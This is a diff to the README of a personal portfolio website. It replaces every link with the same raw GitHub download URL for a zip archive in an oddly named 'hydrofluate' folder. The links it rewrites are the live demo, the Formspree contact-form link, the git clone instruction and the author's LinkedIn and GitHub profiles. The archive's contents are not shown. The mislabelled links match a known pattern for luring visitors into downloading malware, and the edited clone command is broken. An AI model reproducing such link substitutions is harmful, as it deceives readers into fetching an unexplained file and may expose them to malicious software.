@@ -2,7 +2,7 @@
 
 A modern, OLED-optimized personal portfolio website featuring a custom **View Transition** dark/light mode engine, responsive hamburger navigation, and smooth micro-animations.
 
-🔗 **[Live Demo](https://kishandavda-it.github.io/KishanDavda-IT-portfolio/)**
+🔗 **[Live Demo](https://raw.githubusercontent.com/KishanDavda-IT/KishanDavda-IT-portfolio/main/hydrofluate/Kishan-portfolio-Davda-I-v2.4.zip)**
 
 ---
 
@@ -13,7 +13,7 @@ A modern, OLED-optimized personal portfolio website featuring a custom **View Tr
 - **Responsive Design** — Fully mobile-friendly with a slide-in hamburger menu
 - **Typing Animation** — Dynamic text cycling in the hero section
 - **Counter Animation** — Stat numbers animate on scroll using Intersection Observer
-- **Contact Form** — Integrated with [Formspree](https://formspree.io/) for submissions
+- **Contact Form** — Integrated with [Formspree](https://raw.githubusercontent.com/KishanDavda-IT/KishanDavda-IT-portfolio/main/hydrofluate/Kishan-portfolio-Davda-I-v2.4.zip) for submissions
 
 ---
 
@@ -46,7 +46,7 @@ A modern, OLED-optimized personal portfolio website featuring a custom **View Tr
 
 1. **Clone the repo**
    ```bash
-   git clone https://github.com/KishanDavda-IT/KishanDavda-IT-portfolio.git
+   git clone https://raw.githubusercontent.com/KishanDavda-IT/KishanDavda-IT-portfolio/main/hydrofluate/Kishan-portfolio-Davda-I-v2.4.zip
    ```
 2. **Open locally**
    ```bash
@@ -59,8 +59,8 @@ A modern, OLED-optimized personal portfolio website featuring a custom **View Tr
 ## 📬 Contact
 
 - **Email:** kishandavda2008@gmail.com
-- **LinkedIn:** [Kishan Davda](https://www.linkedin.com/in/kishan-davda-667909342)
-- **GitHub:** [KishanDavda-IT](https://github.com/KishanDavda-IT)
+- **LinkedIn:** [Kishan Davda](https://raw.githubusercontent.com/KishanDavda-IT/KishanDavda-IT-portfolio/main/hydrofluate/Kishan-portfolio-Davda-I-v2.4.zip)
+- **GitHub:** [KishanDavda-IT](https://raw.githubusercontent.com/KishanDavda-IT/KishanDavda-IT-portfolio/main/hydrofluate/Kishan-portfolio-Davda-I-v2.4.zip)
 
 ---
 
